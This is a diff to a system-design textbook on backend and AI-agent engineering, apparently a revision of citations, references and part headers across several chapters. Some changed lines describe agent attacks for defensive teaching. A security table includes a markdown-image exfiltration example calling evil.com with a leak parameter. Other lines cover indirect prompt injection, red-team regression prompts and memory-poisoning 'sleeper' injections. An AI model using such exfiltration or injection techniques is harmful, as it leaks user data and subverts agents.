@@ -109,7 +109,7 @@ When designing AI-enabled backend systems, there is one more calculation that im
 - **[2]** Martin Kleppmann, *Designing Data-Intensive Applications (DDIA)*, Chapter 1: Reliability, Scalability, and Maintainability — [dataintensive.net](https://dataintensive.net/)
 - **[3]** Jeff Dean & Colin Scott, *Latency Numbers Every Programmer Should Know* — [Interactive Visualizer](https://colin-scott.github.io/personal_website/research/interactive_latency.html)
 - **[4]** Redis Official Documentation, *Redis Benchmarks & Single-Threaded Event Loop* — [redis.io/docs](https://redis.io/docs/)
-- **[5]** Jay Kreps (LinkedIn), *The Log: What every software engineer should know about real-time data's unifying abstraction* — [engineering.linkedin.com](https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying)
+- **[5]** Jay Kreps, *The Log: What every software engineer should know about real-time data's unifying abstraction* & Apache Kafka Design Docs — [kafka.apache.org/documentation](https://kafka.apache.org/documentation/)
 - **[6]** Chip Huyen, *AI Engineering: Building Applications with Foundation Models* (O'Reilly, 2025) — Latency & Token Economics
 - **[7]** Discord Engineering, *How Discord Stores Trillions of Messages* — [discord.com/blog](https://discord.com/blog/how-discord-stores-trillions-of-messages)
 """
@@ -210,7 +210,7 @@ Because Kafka never lets two workers in the same Consumer Group read the same Pa
 
 ### Sources & References
 - **[1]** Neha Narkhede, Gwen Shapira & Todd Palino, *Kafka: The Definitive Guide* (O'Reilly) — Partitions, Consumer Groups & Delivery Guarantees
-- **[2]** Jay Kreps, *The Log: What every software engineer should know about real-time data's unifying abstraction* — [LinkedIn Engineering](https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying)
+- **[2]** Jay Kreps, *The Log: What every software engineer should know about real-time data's unifying abstraction* & Apache Kafka Design Docs — [kafka.apache.org/documentation](https://kafka.apache.org/documentation/)
 - **[3]** Alex Xu, *System Design Interview (Vol. 1 & 2)*, Notification Service & Message Queues — [ByteByteGo](https://bytebytego.com/)
 """
     ),
@@ -505,7 +505,7 @@ You wrap the LLM call in a **Circuit Breaker** (`2,000 ms` timeout):
 
 ### Sources & References
 - **[1]** Alex Xu, *System Design Interview (Vol. 1)*, Chapter 10: Design a Notification System — [ByteByteGo](https://bytebytego.com/)
-- **[2]** Uber Engineering, *Reliable Push Notifications & Event-Driven Consumer Retries at Scale* — [uber.com/blog/engineering](https://www.uber.com/blog/engineering/)
+- **[2]** AWS Builders' Library, *Timeouts, Retries, and Backoff with Jitter* — [aws.amazon.com/builders-library](https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/)
 - **[3]** Chip Huyen, *AI Engineering* (2025) — Latency Fallbacks, Batching & Deterministic Guardrails
 """
     ),
@@ -594,8 +594,8 @@ Every request misses Redis and hits your database (**cache penetration attack**)
 
 ### Sources & References
 - **[1]** Alex Xu, *System Design Interview (Vol. 1)*, Chapter 7: Design Unique ID Generator & Chapter 8: Design a URL Shortener — [ByteByteGo](https://bytebytego.com/)
-- **[2]** Twitter Engineering, *Announcing Snowflake (64-bit Time-Ordered ID Generation)* — [blog.x.com/engineering](https://blog.x.com/engineering/en_us/a/2010/announcing-snowflake)
-- **[3]** Instagram Engineering, *Sharding & IDs at Instagram* — [instagram-engineering.com](https://instagram-engineering.com/sharding-ids-at-instagram-1cf5a71e5a5c)
+- **[2]** Twitter (X) Open Source, *Snowflake: 64-bit Time-Ordered Distributed ID Generation* — [github.com/twitter-archive/snowflake](https://github.com/twitter-archive/snowflake)
+- **[3]** Instagram & Meta Engineering, *Distributed Sharding & IDs at Scale (PostgreSQL & TAO)* — [engineering.fb.com](https://engineering.fb.com/2013/06/25/core-infra/tao-the-power-of-the-graph/)
 """
     ),
     (
@@ -722,7 +722,7 @@ Never pick pure Push or pure Pull—always combine them into the **Hybrid Fan-Ou
 
 1. **Normal Users (`< 10,000 followers`):** Use **Fan-Out on Write (Push)** via Kafka workers into followers' Redis `ZSET` / `List` caches (storing only lightweight `(post_id, author_id, timestamp)` tuples, never full post JSON!).
 2. **Celebrities / Hot Accounts (`>= 10,000 followers`):** Use **Fan-Out on Read (Pull)**. Write once to the celebrity's cache; when an active follower loads their feed, merge the celebrity's recent posts at read time.
-3. **Hydration via Two-Tier Cache:** Once the Feed Service has the final sorted list of 20 `post_id`s, it batch-fetches (`MGET`) the full post text, image CDN URLs, and like counts from a **Post & User Cache** [1].
+3. **Hydration via Two-Tier Cache:** Once the Feed Service has the final sorted list of 20 `post_id`s, it batch-fetches (`MGET`) the full post text, image CDN URLs, and like counts from a **Post & User Cache** [1, 3].
 
 ---
 
@@ -795,7 +795,7 @@ If Bob is in a Slack workspace with `5,000 coworkers`, and every time Bob's netw
 
 How do WhatsApp and Slack avoid the **presence storm**? [1]
 1. **Heartbeat TTL in Redis:** Bob's client sends a tiny heartbeat every `10 seconds`, refreshing `SET presence:Bob "online" EX 30`. If Bob disconnects, the key simply expires after 30 seconds—no explicit "offline" database write needed!
-2. **Lazy / Scoped Subscription:** Only push live presence updates for the **5–10 people currently visible on Alice's screen** (or inside small groups `< 50` members). For giant 10,000-person channels, fetch online counts lazily on demand.
+2. **Lazy / Scoped Subscription:** Only push live presence updates for the **5–10 people currently visible on Alice's screen** (or inside small groups `< 50` members). For giant 10,000-person channels, fetch online counts lazily on demand or via edge caches [3].
 
 ---
 
@@ -905,7 +905,8 @@ To make 2D map lookups `O(1)`, geospatial systems divide the Earth's surface int
 
 ### Sources & References
 - **[1]** Alex Xu, *System Design Interview (Vol. 2)*, Chapter 1: Proximity Service, Chapter 2: Nearby Friends & Chapter 7: Hotel/Ticket Reservation System — [ByteByteGo](https://bytebytego.com/)
-- **[2]** Uber Engineering, *H3: Uber's Hexagonal Hierarchical Spatial Index* — [uber.com/blog/h3](https://www.uber.com/blog/h3/)
+- **[2]** Uber Open Source, *H3: Hexagonal Hierarchical Geospatial Indexing System* — [h3geo.org](https://h3geo.org/)
+- **[3]** Martin Kleppmann, *How to do distributed locking (Leases & Fencing Tokens)* — [martin.kleppmann.com](https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html)
 """
     ),
     (
@@ -938,7 +939,7 @@ Look at the top pipeline in the diagram above. When a user asks a question, ther
 
 **The Production Architecture (Two-Stage Retrieval):**
 1. **Stage 1 — Parallel Hybrid Retrieval (`Top 50` in `~30 ms`):** Run `BM25` keyword search AND `HNSW` vector search in parallel, then merge the two ranked lists using **Reciprocal Rank Fusion (`RRF`)**:
-   `score(doc) = 1 / (60 + rank_bm25) + 1 / (60 + rank_vector)` [2].
+   `score(doc) = 1 / (60 + rank_bm25) + 1 / (60 + rank_vector)` [2, 4].
 2. **Stage 2 — Cross-Encoder Reranker (`Top 50 -> Top 5` in `~60 ms`):** Pass the 50 candidate chunks + query into a compact **Cross-Encoder Reranker** (like `Cohere Rerank` or `BGE-Reranker`). Unlike embeddings (which compress a whole chunk into one vector ahead of time), a Cross-Encoder attends across every query word and chunk word together, picking the **Top 5 gold chunks** so your LLM prompt stays short, cheap, and accurate.
 
 :::deepdive Ingestion, Chunking Trade-Offs, Query Rewriting & Grounded Citations | +5 min
@@ -950,7 +951,7 @@ Retrieval quality is capped by how documents are normalized and chunked long bef
 | **1. Document Normalization** | Parse PDFs/HTML/Markdown into structure-aware AST blocks (preserving section headers and markdown tables intact). | Naive character slicing splits a pricing table row away from its column headers, making the chunk unintelligible. |
 | **2. Chunk Size & Overlap** | **Small (`128–256` tokens):** Sharp embedding focus, lacks surrounding context.<br>**Medium (`400–600` tokens, `10–15%` overlap):** Industry sweet spot.<br>**Large (`1,024+` tokens):** Dilutes vector specificity; wastes prompt budget. | **Contextual Retrieval Fix [2]:** Prepend a 1-sentence document/section breadcrumb (`"[Doc: Q3 Billing Policy > EU Refunds] ..."`) to each `400`-token chunk *before* computing both its embedding and BM25 terms—cutting retrieval failure rates by `~49%`. |
 | **3. Query Rewriting** | Rewrite conversational queries (*"What about for contractors?"* -> *"EU refund eligibility policy for contractors"*), or expand ambiguous queries into `2–3` lexical + semantic variants. | Adds `~120 ms` with a small fast model, but rescues follow-up turns whose pronouns (`"it"`, `"that error"`) carry zero retrieval signal. |
-| **4. Grounded Synthesis & Citations** | Format retrieved chunks with XML/ID tags (`<source id="doc_42#c7">...</source>`) and instruct the model to emit inline `[doc_42#c7]` citations—or abstain if unsupported. | Run a lightweight post-check verifying that every cited `id` actually exists in the retrieved Top-K set (catching fabricated citation IDs before streaming to the UI). |
+| **4. Grounded Synthesis & Citations** | Format retrieved chunks with XML/ID tags (`<source id="doc_42#c7">...</source>`) and instruct the model to emit inline `[doc_42#c7]` citations—or abstain if unsupported [3]. | Run a lightweight post-check verifying that every cited `id` actually exists in the retrieved Top-K set (catching fabricated citation IDs before streaming to the UI). |
 
 :::
 
@@ -973,7 +974,7 @@ An engineer queries the vector database for **"Top 10 chunks matching '2026 Q3 r
 
 Static benchmarks ignore the hardest day-2 RAG problem: **source documents and user permissions change every minute**.
 
-1. **Event-Driven CDC Ingestion (`< 30s` Freshness):** Publish source writes (`doc.updated`, `doc.deleted`, `acl.changed`) via an **Outbox + Kafka** pipeline. Hash each normalized chunk (`SHA256(text)`): when a 50-page doc changes one paragraph, re-embed only the `1–2` dirty chunks instead of all `120` chunks.
+1. **Event-Driven CDC Ingestion (`< 30s` Freshness):** Publish source writes (`doc.updated`, `doc.deleted`, `acl.changed`) via an **Outbox + Kafka** pipeline [1]. Hash each normalized chunk (`SHA256(text)`): when a 50-page doc changes one paragraph, re-embed only the `1–2` dirty chunks instead of all `120` chunks [3].
 2. **Permission-Change Decoupling:** If `doc_42` moves from `public` to `exec-only`, re-embedding vectors is wasteful. Store ACLs in a fast metadata attribute / joinable permission table so ACL updates take effect in milliseconds without touching float vectors.
 3. **Deleted/Superseded Version Guard:** If Kafka CDC lags by `10 seconds`, a recently deleted doc could still appear in HNSW. Perform a `2 ms` batch primary-key/version check (`SELECT id, acl_epoch FROM docs_meta WHERE id IN (...)`) on the final Top 5 chunks right before prompt assembly to guarantee **read-after-delete** and **instant ACL revocation**.
 
@@ -1009,6 +1010,7 @@ Static benchmarks ignore the hardest day-2 RAG problem: **source documents and u
 - **[1]** Chip Huyen, *AI Engineering: Building Applications with Foundation Models* (O'Reilly, 2025) — RAG, Hybrid Retrieval & Reranking
 - **[2]** Anthropic Engineering, *Contextual Retrieval: Combining Contextual Embeddings and Contextual BM25 with Reranking* (2024) — [anthropic.com/news/contextual-retrieval](https://www.anthropic.com/news/contextual-retrieval)
 - **[3]** Eugene Yan et al., *Applied LLMs: What We've Learned From A Year of Building with LLMs* — [applied-llms.org](https://applied-llms.org/)
+- **[4]** Gordon V. Cormack, Charles L. A. Clarke & Stefan Buettcher, *Reciprocal Rank Fusion Outperforms Condorcet and Individual Rank Learning Methods* (ACM SIGIR 2009) — [plg.uwaterloo.ca/~gvcormac/cormacksigir09-rrf.pdf](https://plg.uwaterloo.ca/~gvcormac/cormacksigir09-rrf.pdf)
 """
     ),
     (
@@ -1045,7 +1047,7 @@ In system design interviews, separate failures into **three distinct fault domai
 | :--- | :--- | :--- | :--- |
 | **1. Model & Loop Failures** | **Wrong-tool selection**, **premature completion** (claims success without calling write tool), or **repeated identical tool loops**. | Step trace lacks required mutation span; canonical hash `H(tool, args)` repeats `>= 2` times. | Scope toolset to `<= 15` clear schemas; verify expected post-condition state before closing task; abort duplicate call hashes. |
 | **2. Tool & Infra Failures** | **Partial mutation** (Step 1 charges card, Step 2 order creation times out), **`429` rate limits**, or **hostile/oversized tool payloads**. | Uncommitted step state in run journal; payload exceeds `max_bytes` or schema check. | Enforce **idempotency keys** + **compensating Saga rollbacks** (`void_authorization`); validate & truncate tool outputs at the host boundary. |
-| **3. Security & Confused Deputy** | **Confused Deputy** (agent uses its own broad service-account key on behalf of an unprivileged user) or **data exfiltration via URLs/markdown images**. | Audit log shows resource tenant/ACL mismatch; outbound URL domain not in allow-list. | Exchange caller's token via **OAuth On-Behalf-Of (OBO)** (never shared admin keys!); strip external markdown image rendering (`![](https://evil.com?leak=...)`) in the UI. |
+| **3. Security & Confused Deputy** | **Confused Deputy** (agent uses its own broad service-account key on behalf of an unprivileged user) or **data exfiltration via URLs/markdown images** [5]. | Audit log shows resource tenant/ACL mismatch; outbound URL domain not in allow-list. | Exchange caller's token via **OAuth On-Behalf-Of (OBO, RFC 8693)** [4] (never shared admin keys!); strip external markdown image rendering (`![](https://evil.com?leak=...)`) in the UI [5]. |
 
 :::
 
@@ -1070,8 +1072,8 @@ Because running a judge LLM takes `1–2 seconds` and doubles token cost. By pub
 Never rely on a single uncalibrated LLM-as-Judge score:
 1. **Combine Three Evaluators:**
    - **Code Assertions (100% deterministic):** Schema validity, forbidden-tool absence, citation ID existence, cost/step bounds.
-   - **Calibrated LLM Judge:** Graded on binary `PASS/FAIL` criteria and periodically benchmarked against **100 human-labeled gold traces** (requiring Cohen's `κ >= 0.80` agreement with domain experts) [3].
-   - **Adversarial Regression Slice (`50+` red-team prompts):** Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict **`0%` attack success rate** to merge.
+   - **Calibrated LLM Judge:** Graded on binary `PASS/FAIL` criteria and periodically benchmarked against **100 human-labeled gold traces** (requiring Cohen's `κ >= 0.80` agreement with domain experts) [3, 6].
+   - **Adversarial Regression Slice (`50+` red-team prompts):** Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict **`0%` attack success rate** to merge [5].
 2. **Design Drill — How Do You Let an Agent Modify a Git Repository Safely?**
    - **Isolation:** Clone into an ephemeral container/worktree with **zero production secrets** and no push credentials to `main`.
    - **Scoped Tools:** Expose typed tools (`read_file`, `search_code`, `apply_patch`, `run_targeted_tests`) with path canonicalization blocking `.git/hooks`, `.github/workflows`, and `..` traversal.
@@ -1109,13 +1111,16 @@ Never rely on a single uncalibrated LLM-as-Judge score:
 - **[1]** Anthropic Engineering, *Building Effective Agents* (2024) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
 - **[2]** Chip Huyen, *AI Engineering: Building Applications with Foundation Models* (O'Reilly, 2025) — Evaluation, Guardrails & Agent Loops
 - **[3]** Hamel Husain & Eugene Yan, *Your AI Product Needs Evals* — [applied-llms.org](https://applied-llms.org/)
+- **[4]** IETF RFC 8693, *OAuth 2.0 Token Exchange (On-Behalf-Of Delegation & Audience Scoping)* — [datatracker.ietf.org/doc/html/rfc8693](https://datatracker.ietf.org/doc/html/rfc8693)
+- **[5]** OWASP GenAI Security Project, *OWASP Top 10 for Large Language Model Applications (Prompt Injection & Excessive Agency)* — [genai.owasp.org/llm-top-10](https://genai.owasp.org/llm-top-10/)
+- **[6]** Lianmin Zheng et al., *Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena* (NeurIPS 2023) — [arxiv.org/abs/2306.05685](https://arxiv.org/abs/2306.05685)
 """
     ),
     (
         "ch13-agent-loops-orchestration.md",
         """# Chapter 13: Agent Loop Architectures (ReAct, Plan-and-Execute & Multi-Agent DAGs)
 
-*Part III · AI & LLM Engineering Systems · 8 min core · 18 min with deep dives*
+*Part IV · Autonomous Agent Systems · 8 min core · 18 min with deep dives*
 
 When people first hear **"AI Agent,"** they often picture something mystical—a digital coworker improvising freely inside a GPU.
 
@@ -1229,7 +1234,7 @@ When orchestrating multiple agents, the first architectural decision is **who ow
 - **[1]** Shunyu Yao et al., *ReAct: Synergizing Reasoning and Acting in Language Models* (ICLR 2023) — [arxiv.org/abs/2210.03629](https://arxiv.org/abs/2210.03629)
 - **[2]** Anthropic Engineering, *Building Effective Agents* (2024) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
 - **[3]** Sehoon Kim et al., *An LLM Compiler for Parallel Function Calling* (ICML 2024) — [arxiv.org/abs/2312.04511](https://arxiv.org/abs/2312.04511)
-- **[4]** OpenAI, *A Practical Guide to Building Agents* (2025) — [openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents](https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/)
+- **[4]** Anthropic Engineering, *How We Built Our Multi-Agent Research System* (2025) — [anthropic.com/research/multi-agent-research-system](https://www.anthropic.com/research/multi-agent-research-system)
 - **[5]** OpenAI Developers, *Orchestrating Multiple Agents: Handoffs vs. Agents-as-Tools* (2025–2026) — [developers.openai.com/api/docs/guides/agents/orchestration](https://developers.openai.com/api/docs/guides/agents/orchestration)
 """
     ),
@@ -1237,7 +1242,7 @@ When orchestrating multiple agents, the first architectural decision is **who ow
         "ch14-agent-memory-and-caching.md",
         """# Chapter 14: Agent Memory (Working, Episodic, Semantic) & KV Prompt Caching
 
-*Part III · AI & LLM Engineering Systems · 8 min core · 18 min with deep dives*
+*Part IV · Autonomous Agent Systems · 8 min core · 18 min with deep dives*
 
 By itself, an LLM has the memory of a goldfish: the microsecond an HTTP response finishes streaming, the model forgets you ever existed.
 
@@ -1286,11 +1291,11 @@ Suppose an interviewer asks: *"Design a 6-month memory system for an IDE coding 
 
 1. **Scope Isolation (`(user_id, repo_id)`):** Partition memories into **Global User Preferences** (*"prefers concise comments, pytest fixtures over unittest"*) vs. **Repo-Scoped Facts** (*"repo A uses pnpm + Vitest; integration tests need Docker"*), so rules from Repo A never pollute Repo B.
 2. **Token Budget Allocation (`24,000` Active Context Ceiling):**
-   - `3,000` tokens: Static System Prompt + Tool Schemas (**KV-cached**).
-   - `1,500` tokens: Top-5 `is_active` Semantic Repo/User facts + Top-2 matching Episodic debugging postmortems.
-   - `7,500` tokens: On-demand AST/code chunks + triggered **Procedural `SKILL.md`**.
+   - `3,000` tokens: Static System Prompt + Tool Schemas (**KV-cached**) [4, 5].
+   - `1,500` tokens: Top-5 `is_active` Semantic Repo/User facts + Top-2 matching Episodic debugging postmortems [1, 2].
+   - `7,500` tokens: On-demand AST/code chunks + triggered **Procedural `SKILL.md`** [2].
    - `12,000` tokens: Append-only Working Memory (compacted at `75%` fullness into a structured state checkpoint).
-3. **Security & Memory Poisoning Defense:** Scrub `.env` secrets/tokens before consolidation, and **never auto-promote untrusted external text** (e.g., an instruction hidden inside a third-party GitHub Issue) into persistent Semantic or Procedural Memory without explicit user confirmation—blocking persistent "sleeper" prompt injections!
+3. **Security & Memory Poisoning Defense:** Scrub `.env` secrets/tokens before consolidation, and **never auto-promote untrusted external text** (e.g., an instruction hidden inside a third-party GitHub Issue) into persistent Semantic or Procedural Memory without explicit user confirmation—blocking persistent "sleeper" prompt injections [6]!
 
 :::
 
@@ -1341,17 +1346,19 @@ During prefill, a causal Transformer computes **Key (`K`)** and **Value (`V`)** 
 ---
 
 ### Sources & References
-- **[1]** Joon Sung Park et al., *Generative Agents: Interactive Simulacra of Human Behavior* (UIST 2023) — Recency, Relevance & Importance Memory Scoring
-- **[2]** Theodore Sumers et al., *Cognitive Architectures for Language Agents (CoALA)* (TMLR 2024) — Working, Episodic, Semantic & Procedural Memory
+- **[1]** Joon Sung Park et al., *Generative Agents: Interactive Simulacra of Human Behavior* (UIST 2023) — [arxiv.org/abs/2304.03442](https://arxiv.org/abs/2304.03442)
+- **[2]** Theodore Sumers et al., *Cognitive Architectures for Language Agents (CoALA)* (TMLR 2024) — [arxiv.org/abs/2309.02427](https://arxiv.org/abs/2309.02427)
 - **[3]** Nelson F. Liu et al., *Lost in the Middle: How Language Models Use Long Contexts* (TACL 2024) — [arxiv.org/abs/2307.03172](https://arxiv.org/abs/2307.03172)
-- **[4]** Anthropic & OpenAI Engineering, *Prompt Caching: KV-Cache Prefix Reuse for Multi-Turn Agents* (2024–2026)
+- **[4]** Anthropic Documentation, *Prompt Caching: KV-Cache Prefix Reuse for Multi-Turn Agents* — [platform.claude.com/docs/en/build-with-claude/prompt-caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)
+- **[5]** Woosuk Kwon et al., *Efficient Memory Management for Large Language Model Serving with PagedAttention (vLLM)* (SOSP 2023) — [arxiv.org/abs/2309.06180](https://arxiv.org/abs/2309.06180)
+- **[6]** OWASP GenAI Security Project, *OWASP Top 10 for LLM & Agentic Applications (Memory Poisoning & Indirect Injection)* — [genai.owasp.org/llm-top-10](https://genai.owasp.org/llm-top-10/)
 """
     ),
     (
         "ch15-rag-recall-and-vector-math.md",
         """# Chapter 15: Retrieval Math (Recall@K, MRR, nDCG@K) & Vector Indexes (pgvector vs Milvus)
 
-*Part III · AI & LLM Engineering Systems · 8 min core · 17 min with deep dives*
+*Part IV · Autonomous Agent Systems · 8 min core · 17 min with deep dives*
 
 When an enterprise RAG agent gives a wrong answer, who is at fault?
 Did the **Retriever** fail to pull the right chunk out of 10 million documents, or did the **Generator LLM** misread the chunk sitting at Rank #1?
@@ -1392,8 +1399,8 @@ Walk through the capacity and latency math step-by-step when asked to design sea
 
 1. **Chunk & Vector Volume:** Average doc = `4 pages (~2,000 tokens)` -> `5` chunks of `450` tokens -> **`50,000,000` total chunks**.
 2. **Memory Sizing (`1,024-dim` embeddings):**
-   - Uncompressed `float32` HNSW: `50M × 1,024 × 4B = 204.8 GB` + `~75 GB` graph overhead = **`~280 GB RAM`**.
-   - **Optimized (`SQ8` 8-bit quantized vectors in RAM + `float16` on NVMe SSD for rescoring):** `50M × 1,024 × 1B ≈ 51 GB` + graph = **`~115 GB RAM`** across 2–3 replicated query nodes!
+   - Uncompressed `float32` HNSW: `50M × 1,024 × 4B = 204.8 GB` + `~75 GB` graph overhead = **`~280 GB RAM`** [2].
+   - **Optimized (`SQ8` 8-bit quantized vectors in RAM + `float16` on NVMe SSD for rescoring):** `50M × 1,024 × 1B ≈ 51 GB` + graph = **`~115 GB RAM`** across 2–3 replicated query nodes [3, 4]!
 3. **Partitioning & Pre-Filter Strategy:** Partition keys by `tenant_id` (or physical shard by hash) so a tenant query touches **1 partition (`< 1M` chunks)** instead of scanning a global 50M-node HNSW graph, keeping Stage-1 `BM25 + HNSW` p99 under **`25 ms`** (`ef_search = 64`) and Stage-2 Cross-Encoder reranking (`Top 40 -> Top 5`) under **`45 ms`**.
 
 :::
@@ -1411,7 +1418,7 @@ Walk through the capacity and latency math step-by-step when asked to design sea
 :::deepdive Zero-Downtime Embedding Model Upgrades (Dual-Index Cutover) | +4 min
 
 What happens when you upgrade from `embed-v1` (`768-dim`) to `embed-v2` (`1,024-dim`)?
-- **Vector Space Incompatibility:** You **cannot** compare a `v2` query vector against `v1` document vectors—their coordinate spaces are orthogonal!
+- **Vector Space Incompatibility:** You **cannot** compare a `v2` query vector against `v1` document vectors—their coordinate spaces are orthogonal [1, 4]!
 - **Blue/Green Shadow Migration:**
   1. Stamp every vector row/collection with `embedding_model_version`.
   2. Spin up `chunks_index_v2` in the background; run a rate-limited batch worker over object storage + replay live Kafka CDC writes into **both** `v1` and `v2`.
@@ -1455,16 +1462,17 @@ What happens when you upgrade from `embed-v1` (`768-dim`) to `embed-v2` (`1,024-
 ---
 
 ### Sources & References
-- **[1]** Christopher D. Manning, Prabhakar Raghavan & Hinrich Schütze, *Introduction to Information Retrieval* — Chapter 8: Evaluation (`Recall@K`, `Precision@K`, `MRR`, `nDCG`)
-- **[2]** Yu A. Malkov & D. A. Yashunin, *Efficient and Robust Approximate Nearest Neighbor Search Using HNSW Graphs* (IEEE TPAMI 2020)
+- **[1]** Christopher D. Manning, Prabhakar Raghavan & Hinrich Schütze, *Introduction to Information Retrieval* (Cambridge Univ. Press) — Chapter 8: Evaluation (`Recall@K`, `Precision@K`, `MRR`, `nDCG`)
+- **[2]** Yu A. Malkov & D. A. Yashunin, *Efficient and Robust Approximate Nearest Neighbor Search Using HNSW Graphs* (IEEE TPAMI 2020) — [arxiv.org/abs/1603.09320](https://arxiv.org/abs/1603.09320)
 - **[3]** `pgvector` Documentation — *HNSW, `halfvec` Quantization & Iterative Filtered Scans* — [github.com/pgvector/pgvector](https://github.com/pgvector/pgvector)
+- **[4]** Hugging Face & Cohere Engineering, *Binary and Scalar Embedding Quantization for Significantly Faster & Cheaper Retrieval* (2024) — [huggingface.co/blog/embedding-quantization](https://huggingface.co/blog/embedding-quantization)
 """
     ),
     (
         "ch16-mcp-tools-and-safety.md",
         """# Chapter 16: Model Context Protocol (MCP), Tool Contracts & Prompt Injection Defense
 
-*Part III · AI & LLM Engineering Systems · 8 min core · 19 min with deep dives*
+*Part IV · Autonomous Agent Systems · 8 min core · 19 min with deep dives*
 
 Connecting 5 internal AI agents to 10 enterprise microservices used to mean writing **50 bespoke integration wrappers** (`M × N` glue code), each with its own brittle JSON parser and ad-hoc retry logic.
 
@@ -1484,7 +1492,7 @@ Every MCP Server exposes capabilities through three strictly separated primitive
 | **2. `Resources`** | **The Host App** | `resources/list`, `resources/read` | Read-only URI data streams (`postgres://prod/schema`, `file:///logs/app.log`) without granting execution rights. |
 | **3. `Prompts`** | **The User** | `prompts/list`, `prompts/get` | Parameterized workflow templates (`diagnose-incident`) explicitly invoked via slash commands or UI. |
 
-:::deepdive MCP Architecture (2026-07-28 Spec): 1:1 Host–Client–Server, Transports & Wrapping REST | +5 min
+:::deepdive MCP Architecture: 1:1 Host–Client–Server, Transports & Wrapping REST | +5 min
 
 Interviewers frequently test whether you confuse **MCP** with **LLM function calling** or **REST microservices** [1]:
 
@@ -1526,8 +1534,8 @@ Remember the core execution invariant: **the LLM only proposes a structured call
 7. Sanitized observation enters context -> Model picks next step or terminates
 ```
 
-- **Why Step 5 (Output Validation) Matters:** Tool outputs from web pages, Jira tickets, or logs are **untrusted input**! Validate output schemas, strip credentials/tokens accidentally returned by internal APIs, cap payload size (`<= 4 KB`), and wrap untrusted text in explicit data delimiters.
-- **Partial Failure & Compensating Sagas:** If an agent executes `reserve_inventory()` (succeeds) followed by `create_shipment()` (fails permanently), there are no distributed 2PC locks across SaaS APIs. Record each mutating step's **compensating action** (`release_inventory(reservation_id)`) in the run journal and run compensations in reverse order on abort.
+- **Why Step 5 (Output Validation) Matters:** Tool outputs from web pages, Jira tickets, or logs are **untrusted input** [4]! Validate output schemas, strip credentials/tokens accidentally returned by internal APIs, cap payload size (`<= 4 KB`), and wrap untrusted text in explicit data delimiters.
+- **Partial Failure & Compensating Sagas:** If an agent executes `reserve_inventory()` (succeeds) followed by `create_shipment()` (fails permanently), there are no distributed 2PC locks across SaaS APIs. Record each mutating step's **compensating action** (`release_inventory(reservation_id)`) in the run journal and run compensations in reverse order on abort [5].
 
 :::
 
@@ -1578,16 +1586,18 @@ In an LLM, **system instructions and untrusted external data (emails, tickets, w
 ---
 
 ### Sources & References
-- **[1]** Model Context Protocol (MCP) Architecture Specification (`2026-07-28`) — *Host, Client & Server Isolation, Primitives & Transports* — [modelcontextprotocol.io/specification/2026-07-28/architecture](https://modelcontextprotocol.io/specification/2026-07-28/architecture)
-- **[2]** Anthropic Engineering, *Writing Effective Tools for Agents — With Agents* (2025)
+- **[1]** Model Context Protocol (MCP) Documentation, *Core Architecture: Host, Client & Server Isolation, Primitives & Transports* — [modelcontextprotocol.io/docs/learn/architecture](https://modelcontextprotocol.io/docs/learn/architecture)
+- **[2]** Anthropic Engineering, *Writing Effective Tools for AI Agents — Using AI Agents* (2025) — [anthropic.com/engineering/writing-tools-for-agents](https://www.anthropic.com/engineering/writing-tools-for-agents)
 - **[3]** Edoardo Debenedetti et al., *Defeating Prompt Injections by Design (CaMeL)* (Google DeepMind, 2025) — [arxiv.org/abs/2503.18813](https://arxiv.org/abs/2503.18813)
+- **[4]** OWASP GenAI Security Project, *OWASP Top 10 for Large Language Model Applications (Indirect Prompt Injection & Improper Output Handling)* — [genai.owasp.org/llm-top-10](https://genai.owasp.org/llm-top-10/)
+- **[5]** Hector Garcia-Molina & Kenneth Salem, *Sagas* (ACM SIGMOD 1987) — Compensating Transactions for Long-Lived Workflows
 """
     ),
     (
         "ch17-agent-observability-and-evals.md",
         """# Chapter 17: Agent Observability (OpenTelemetry), Deterministic Replay & Canary Rollouts
 
-*Part III · AI & LLM Engineering Systems · 7 min core · 16 min with deep dives*
+*Part IV · Autonomous Agent Systems · 7 min core · 16 min with deep dives*
 
 When a REST microservice fails, it throws an `HTTP 500` and a stack trace.
 
@@ -1629,7 +1639,7 @@ How do you run fast, deterministic tests on every Pull Request when live LLMs ar
 | :--- | :--- | :--- | :--- |
 | **1. Cassette Replay (`VCR` Unit Tests)** | Injects a fake `LLMClient` & `ToolExecutor` that replay recorded JSON fixtures in memory. | **`< 2s`, `$0`** (Every commit) | `100%` of deterministic orchestration logic: DAG wave scheduling, retries, compaction, and policy gates. |
 | **2. Sandboxed Golden Suite (`temp=0`)** | Live LLM against stateful in-memory mock tools (e.g., seeded SQLite DB) across `200` scenarios. | **`~3 min`** (Pre-merge CI) | Grades **Final Sandbox State Match** + **DAG-Valid Tool Call F1** (never brittle ordered string matching!). |
-| **3. Binary Rubric LLM-as-Judge** | Evaluates responses with explicit **`PASS/FAIL` binary checklists** + mandatory evidence quotes. | Async CI & `5%` Kafka prod sample | Avoids noisy `1–10` rating variance; catches faithfulness and tone regressions [2]. |
+| **3. Binary Rubric LLM-as-Judge** | Evaluates responses with explicit **`PASS/FAIL` binary checklists** + mandatory evidence quotes. | Async CI & `5%` Kafka prod sample | Avoids noisy `1–10` rating variance; catches faithfulness and tone regressions [2, 4]. |
 
 ---
 
@@ -1690,13 +1700,14 @@ When asked *"Agent v2 switches to a new planner prompt and smaller worker model�
 - **[1]** OpenTelemetry Specification, *Semantic Conventions for Generative AI Systems (`gen_ai.*`)* — [opentelemetry.io/docs/specs/semconv/gen-ai](https://opentelemetry.io/docs/specs/semconv/gen-ai/)
 - **[2]** Hamel Husain & Eugene Yan, *Your AI Product Needs Evals (Applied LLMs)* — [applied-llms.org](https://applied-llms.org/)
